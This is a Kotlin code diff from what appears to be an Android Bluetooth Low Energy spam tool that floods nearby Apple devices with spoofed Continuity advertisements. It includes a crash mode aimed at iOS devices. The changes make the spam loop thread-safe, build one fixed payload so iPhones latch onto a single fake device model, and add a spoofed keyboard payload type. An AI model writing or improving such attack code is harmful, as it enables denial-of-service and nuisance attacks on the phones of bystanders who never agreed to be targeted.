@@ -9,6 +9,9 @@ class ContinuitySingleSpam(
     private val crashMode: Boolean
 ) : Spammer {
 
+    
+
+    @Volatile
     private var isSpamming = false
     private var blinkRunnable: Runnable? = null
     private val executor: ExecutorService = Executors.newSingleThreadExecutor()
@@ -25,8 +28,10 @@ class ContinuitySingleSpam(
             // physical device instead of flapping colors every packet.
             val deviceVal = device.value.removePrefix("0x").uppercase()
             val fixedColor = ContinuityPayloads.pickRandomColorForDevice(deviceVal, rand)
+            // Build the frame ONCE so iOS latches a single stable model; the
+            // shared BleSpamTx turns the repeat emits below into no-ops.
+            val payload = buildPayload(device, crashMode, rand, fixedColor)
             while (isSpamming) {
-                val payload = buildPayload(device, crashMode, rand, fixedColor)
                 try {
                     advertiser.advertiseApple(payload)
                 } catch (_: Exception) {
@@ -60,6 +65,7 @@ class ContinuitySingleSpam(
 
     private fun buildPayload(device: ContinuityDevice, crashMode: Boolean, rand: Random, fixedColor: String): ByteArray {
         return when (device.deviceType) {
+            ContinuityType.KEYBOARD -> ContinuityPayloads.keyboardPayload()
             ContinuityType.ACTION -> ContinuityPayloads.nearbyActionPayload(
                 device.value.removePrefix("0x").uppercase(), crashMode, rand
             )
